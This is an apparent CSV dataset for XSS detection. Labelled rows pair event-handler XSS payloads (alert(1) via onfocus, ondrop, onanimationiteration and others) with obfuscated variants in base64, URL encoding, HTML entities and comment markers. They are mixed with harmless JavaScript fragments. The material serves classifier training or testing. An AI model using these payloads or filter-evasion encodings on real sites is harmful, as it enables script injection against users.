sample_id,label,payload_original,payload_obfuscated,generator,recipe
3525,1,"<style>@keyframes slidein {}</style><nextid style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></nextid>",PHN0eWxlPkBrZXlmcmFtZXMgc2xpZGVpbiB7fTwvc3R5bGU+PG5leHRpZCBzdHlsZT0iYW5pbWF0aW9uLWR1cmF0aW9uOjFzO2FuaW1hdGlvbi1uYW1lOnNsaWRlaW47YW5pbWF0aW9uLWl0ZXJhdGlvbi1jb3VudDoyIiBvbmFuaW1hdGlvbml0ZXJhdGlvbj0iYWxlcnQoMSkiPjwvbmV4dGlkPg==,tool_baseline,base64
3526,0,"} else { element.setattribute(name, value === true ? '' : value); }","} else { element.setattribute(name, value === true ? '' : value); }",tool_baseline,none
3527,0,"var uid = cash.uid = ""_cash"" + date.now()","var uid = cash.uid = ""_cash"" + date.now()",tool_baseline,none
3528,0,"$(document).on('keyup', text_area_selector, function() { m.textareaautoresize($(this)); });","$(document).on('keyup', text_area_selector, function() { m.textareaautoresize($(this)); });",tool_baseline,none
3529,0,"'<div class= ""modal timepicker-modal"">',","'<div class= ""modal timepicker-modal"">',",tool_baseline,none
3530,0,return formatteddate,return formatteddate,tool_baseline,none
3531,0,const event_mouseenter$1 = `mouseenter${event_key$8}`; const event_mouseleave$1 = `mouseleave${event_key$8}`; const event_drag_start = `dragstart${event_key$8}`;,const event_mouseenter$1 = `mouseenter${event_key$8}`; const event_mouseleave$1 = `mouseleave${event_key$8}`; const event_drag_start = `dragstart${event_key$8}`;,tool_baseline,none
3532,0,"var opts = this.options,","var opts = this.options,",tool_baseline,none
3533,0,"movehandles(movement > 0, proposal, data.locations, data.handlenumbers); } function eventend ( event, data ) {","movehandles(movement > 0, proposal, data.locations, data.handlenumbers); } function eventend ( event, data ) {",tool_baseline,none
3534,0,value: function renderbody(rows) { return '<tbody>' + rows.join('') + '</tbody>'; },value: function renderbody(rows) { return '<tbody>' + rows.join('') + '</tbody>'; },tool_baseline,none
3535,1,"<body onpaste=""alert(1)"" contenteditable>test</body>",%3Cbody%20onpaste%3D%22alert%281%29%22%20contenteditable%3Etest%3C%2Fbody%3E,tool_baseline,urlencode
3536,0,"return { top: box.top + win.pageyoffset - docelem.clienttop, left: box.left + win.pagexoffset - docelem.clientleft","return { top: box.top + win.pageyoffset - docelem.clienttop, left: box.left + win.pagexoffset - docelem.clientleft",tool_baseline,none
3537,0,const toasttrigger = document.getelementbyid('livetoastbtn'),const toasttrigger = document.getelementbyid('livetoastbtn'),tool_baseline,none
3538,1,"<address draggable=""true"" ondragenter=""alert(1)"">test</address>","<address draggable/*OBF*/=""true/*OBF*/"" ondragenter=""alert(1)"">t/*OBF*/est</address>",tool_baseline,comment_marker
3539,0,placement: state.placement })) : tetheroffset; var normalizedtetheroffsetvalue = typeof tetheroffsetvalue === 'number' ? {,placement: state.placement })) : tetheroffset; var normalizedtetheroffsetvalue = typeof tetheroffsetvalue === 'number' ? {,tool_baseline,none
3540,0,return el.contains(selector); }); return this.filter(comparator);,return el.contains(selector); }); return this.filter(comparator);,tool_baseline,none
3541,1,<p onpointerenter=alert(1)>xss</p>,<p onpointerenter=alert(1)>xss</p>,tool_baseline,whitespace_noise
3542,1,"<listing draggable=""true"" ondragleave=""alert(1)"">test</listing>",PGxpc3RpbmcgZHJhZ2dhYmxlPSJ0cnVlIiBvbmRyYWdsZWF2ZT0iYWxlcnQoMSkiPnRlc3Q8L2xpc3Rpbmc+,tool_baseline,base64
3543,1,"<input value = """" type = text>",%3Cinput%20value%20%3D%20%22%22%20type%20%3D%20text%3E,tool_baseline,urlencode
3544,0,"</div> </td> </tr><tr><th scope=""row"" class=""navbox-group"" style=""width:1%"">related </th><td class=""navbox-list navbox-even"" style=""text-align:left;border-left-width:2px;border-left-style:solid;width:100%;padding:0px"">","</div> </td> </tr><tr><th scope=""row"" class=""navbox-group"" style=""width:1%"">related </th><td class=""navbox-list navbox-even"" style=""text-align:left;border-left-width:2px;border-left-style:solid;width:100%;padding:0px"">",tool_baseline,none
3545,0,"targets: this._overlay,","targets: this._overlay,",tool_baseline,none
3546,0,"<dl class=""docutils"">","<dl class=""docutils"">",tool_baseline,none
3547,0,"$optionli.prop('selected', notadded)","$optionli.prop('selected', notadded)",tool_baseline,none
3548,0,"const class_name_dropdown_item = 'dropdown-item'; const class_name_active$1 = 'active'; const selector_data_spy = '[data-bs-spy=""scroll""]';","const class_name_dropdown_item = 'dropdown-item'; const class_name_active$1 = 'active'; const selector_data_spy = '[data-bs-spy=""scroll""]';",tool_baseline,none
3549,0,"function eventstart ( event, data ) {","function eventstart ( event, data ) {",tool_baseline,none
3550,1,"<div draggable=""true"" contenteditable>drag me</div><spacer ondrop=alert(1) contenteditable>drop here</spacer>","<div draggable=""true""   contenteditable>drag me</  div><spacer ondrop=alert(1) contenteditable>drop here</spacer>",tool_baseline,whitespace_noise
3551,0,state.modifiersdata[name] = data; } // eslint-disable-next-line import/no-unused-modules const preventoverflow$1 = {,state.modifiersdata[name] = data; } // eslint-disable-next-line import/no-unused-modules const preventoverflow$1 = {,tool_baseline,none
3552,1,"<audio onkeydown=""alert(1)"" contenteditable>test</audio>","<audio onkeydown=""alert(1)""  contenteditable> test</audio>",tool_baseline,whitespace_noise
3553,0,_this68._setupeventhandlers(),_this68._setupeventhandlers(),tool_baseline,none
3554,1,"<tfoot oncopy=""alert(1)"" contenteditable>test</tfoot>","<tfoot oncopy=""alert(1)"" contenteditable>test/*OBF*/</tfoot>",tool_baseline,comment_marker
3555,1,<button autofocus onfocus=alert(1)>test</button>,<button autofocus onfocus=alert( 1)>test</ button>,tool_baseline,whitespace_noise
3556,0,"}, { key: ""_finishselection"", value: function _finishselection() {","}, { key: ""_finishselection"", value: function _finishselection() {",tool_baseline,none
3557,0,"toggle(selector_dropdown_toggle, class_name_active); toggle(selector_dropdown_menu, class_name_show$1); outerelem.setattribute('aria-expanded', open);","toggle(selector_dropdown_toggle, class_name_active); toggle(selector_dropdown_menu, class_name_show$1); outerelem.setattribute('aria-expanded', open);",tool_baseline,none
3558,0,deletechip(chipindex) {,deletechip(chipindex) {,tool_baseline,none
3559,0,this.$modalel.insertbefore(this.el),this.$modalel.insertbefore(this.el),tool_baseline,none
3560,1,"<big onmouseup=""alert(1)"">test</big>",&lt;big onmouseup=&quot;alert(1)&quot;&gt;test&lt;/big&gt;,tool_baseline,html_entities
3561,1,"<datalist onpaste=""alert(1)"" contenteditable>test</datalist>","<datalist onpaste=  ""alert(1)  "" contenteditable>test<  /datalist>",tool_baseline,whitespace_noise
3562,0,if (isdisabled(this._element) || !this._isshown()) { return; },if (isdisabled(this._element) || !this._isshown()) { return; },tool_baseline,none
3563,0,var $chips = $(this).closest('.chips'),var $chips = $(this).closest('.chips'),tool_baseline,none
3564,0,"autocomplete._keydown = true; var keycode = e.keycode, lielement = void 0,","autocomplete._keydown = true; var keycode = e.keycode, lielement = void 0,",tool_baseline,none
3565,1,"<samp onkeydown=""alert(1)"" contenteditable>test</samp>",%3Csamp%20onkeydown%3D%22alert%281%29%22%20contenteditable%3Etest%3C%2Fsamp%3E,tool_baseline,urlencode
3566,0,value: function _handleinputfocus() {,value: function _handleinputfocus() {,tool_baseline,none
3567,1,"<cite onbeforepaste=""alert(1)"" contenteditable>test</cite>","<cite onbeforepaste=""alert(1)"" contenteditable>test</cite>",tool_baseline,whitespace_noise
3568,1,<main onpointerdown=alert(1)>xss</main>,&lt;main onpointerdown=alert(1)&gt;xss&lt;/main&gt;,tool_baseline,html_entities
3569,0,cleartimeout(timeout),cleartimeout(timeout),tool_baseline,none
3570,0,break; case 'vertical': parsed.ort = 1;,break; case 'vertical': parsed.ort = 1;,tool_baseline,none
3571,0,"let _defaults = { indicators: true, height: 400,","let _defaults = { indicators: true, height: 400,",tool_baseline,none
3572,0,"parsed.animate = entry; if ( typeof entry !== 'boolean' ){ throw new error(""nouislider: 'animate' option must be a boolean."");","parsed.animate = entry; if ( typeof entry !== 'boolean' ){ throw new error(""nouislider: 'animate' option must be a boolean."");",tool_baseline,none
3573,0,return array.isarray(a) ? a : [a]; } function countdecimals ( numstr ) {,return array.isarray(a) ? a : [a]; } function countdecimals ( numstr ) {,tool_baseline,none
3574,1,"<style>:target {color:red;}</style><plaintext id=x style=""transition:color 1s"" ontransitionend=alert(1)></plaintext>","<style>:target {color:red;}</style><plaintext id=x style=""transition:color 1s"" ontransitionend= alert(1)></plaintext>",tool_baseline,whitespace_noise
3575,1,"<style>@keyframes slidein {}</style><section style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></section>","<style>@keyfram/*OBF*/es slidein {}</style><section s/*OBF*/tyl/*OBF*/e=""animati/*OBF*/on-duration:1s;animation-name:slidein;animatio/*OBF*/n-iteration-count:2"" o/*OBF*/nanimationiteration=""al/*OBF*/ert(1)""></section>",tool_baseline,comment_marker
3576,0,"function hydrateobj(obj, meta = {}) { for (const [key, value] of object.entries(meta)) { try {","function hydrateobj(obj, meta = {}) { for (const [key, value] of object.entries(meta)) { try {",tool_baseline,none
3577,1,"<ol ondblclick=""alert(1)"">test</ol>",&lt;ol ondblclick=&quot;alert(1)&quot;&gt;test&lt;/ol&gt;,tool_baseline,html_entities
3578,0,var checks = []; if (checkmainaxis) { checks.push(overflow[_baseplacement] <= 0);,var checks = []; if (checkmainaxis) { checks.push(overflow[_baseplacement] <= 0);,tool_baseline,none
3579,1,<html onpointerover=alert(1)>xss</html>,PGh0bWwgb25wb2ludGVyb3Zlcj1hbGVydCgxKT54c3M8L2h0bWw+,tool_baseline,base64
3580,0,} else { this.offsetx = 40; },} else { this.offsetx = 40; },tool_baseline,none
3581,1,<var onpointerleave=alert(1)>xss</var>,&lt;var onpointerleave=alert(1)&gt;xss&lt;/var&gt;,tool_baseline,html_entities
3582,0,"<li id=""cite_note-77""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-77"">^ </a> </b>","<li id=""cite_note-77""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-77"">^ </a> </b>",tool_baseline,none
3583,1,<iframe id=x tabindex=1 onbeforedeactivate=alert(1)></iframe><input autofocus>,%3Ciframe%20id%3Dx%20tabindex%3D1%20onbeforedeactivate%3Dalert%281%29%3E%3C%2Fiframe%3E%3Cinput%20autofocus%3E,tool_baseline,urlencode
3584,0,"<dd><a href=""/en/master/"">master</a></dd>","<dd><a href=""/en/master/"">master</a></dd>",tool_baseline,none
3585,0,this._createdragtarget(),this._createdragtarget(),tool_baseline,none
3586,0,"this.el.addeventlistener('click', this._handleinputclickbound); this.container.addeventlistener( 'mousedown',","this.el.addeventlistener('click', this._handleinputclickbound); this.container.addeventlistener( 'mousedown',",tool_baseline,none
3587,1,<details id=x tabindex=1 onbeforedeactivate=alert(1)></details><input autofocus>,<details id=x/*OBF*/ tabindex=1 onbeforedeactivate=alert(1)></details><input autofocus>,tool_baseline,comment_marker
3588,0,"}, parents(element, selector) { const parents = []","}, parents(element, selector) { const parents = []",tool_baseline,none
3589,0,"const data = { set(element, key, instance) { if (!elementmap.has(element)) {","const data = { set(element, key, instance) { if (!elementmap.has(element)) {",tool_baseline,none
3590,0,selected = this._toggleentryfromarray(key); } else { $(this.dropdownoptions).find('li').removeclass('selected');,selected = this._toggleentryfromarray(key); } else { $(this.dropdownoptions).find('li').removeclass('selected');,tool_baseline,none
3591,0,"} eventhandler.on(document, event_click_data_api$5, selector_data_slide, function (event) { const target = selectorengine.getelementfromselector(this);","} eventhandler.on(document, event_click_data_api$5, selector_data_slide, function (event) { const target = selectorengine.getelementfromselector(this);",tool_baseline,none
3592,0,const targetelement = entry => this._targetlinks.get(`#${entry.target.id}`) const activate = entry => { this._previousscrolldata.visibleentrytop = entry.target.offsettop,const targetelement = entry => this._targetlinks.get(`#${entry.target.id}`) const activate = entry => { this._previousscrolldata.visibleentrytop = entry.target.offsettop,tool_baseline,none
3593,1,"<figcaption onbeforecut=""alert(1)"" contenteditable>test</figcaption>","<figcaption onbeforecut=""alert(1)"" contenteditable>test</ figcaption>",tool_baseline,whitespace_noise
3594,0,"return component; }(); ; // required for meteor package, the use of window prevents export by meteor","return component; }(); ; // required for meteor package, the use of window prevents export by meteor",tool_baseline,none
3595,1,<acronym id=x tabindex=1 ondeactivate=alert(1)></acronym><input id=y autofocus>,<acronym id=x tabindex=1 ondeac/*OBF*/tiva/*OBF*/te=alert(1)></acronym><inp/*OBF*/ut id=y autofo/*OBF*/cus>,tool_baseline,comment_marker
3596,0,for (var a in obj) { if (obj.hasownproperty(a)) { style += a + ':' + obj[a] + ';';,for (var a in obj) { if (obj.hasownproperty(a)) { style += a + ':' + obj[a] + ';';,tool_baseline,none
3597,1,"<noframes onbeforecopy=""alert(1)"" contenteditable>test</noframes>","<noframes onbeforecopy="" alert( 1)"" contenteditable>test</  noframes>",tool_baseline,whitespace_noise
3598,0,this.el.classlist.remove('pinned'),this.el.classlist.remove('pinned'),tool_baseline,none
3599,0,"</span> </a> </i>&#93; </sup>. many deep learning systems need to be able to learn chains ten or more causal links in length.<sup id=""cite_ref-schmidhuber2015_246-0"" class=""reference""><a href=""#cite_note-schmidhuber2015-246"">&#91;235&#93; </a> </sup> deep learning has transformed many important subfields of artificial intelligence<sup class=""noprint inline-template"" style=""white-space:nowrap;"">&#91;<i><a href=""/wiki/wikipedia:please_clarify"" title=""wikipedia:please clarify""><span title=""the reason for this is unclear. (july 2019)"">why?","</span> </a> </i>&#93; </sup>. many deep learning systems need to be able to learn chains ten or more causal links in length.<sup id=""cite_ref-schmidhuber2015_246-0"" class=""reference""><a href=""#cite_note-schmidhuber2015-246"">&#91;235&#93; </a> </sup> deep learning has transformed many important subfields of artificial intelligence<sup class=""noprint inline-template"" style=""white-space:nowrap;"">&#91;<i><a href=""/wiki/wikipedia:please_clarify"" title=""wikipedia:please clarify""><span title=""the reason for this is unclear. (july 2019)"">why?",tool_baseline,none
3600,0,var wrapper = document.createelement('i'); wrapper.classname = el.classname + ' waves-input-wrapper'; var elementstyle = el.getattribute('style');,var wrapper = document.createelement('i'); wrapper.classname = el.classname + ' waves-input-wrapper'; var elementstyle = el.getattribute('style');,tool_baseline,none
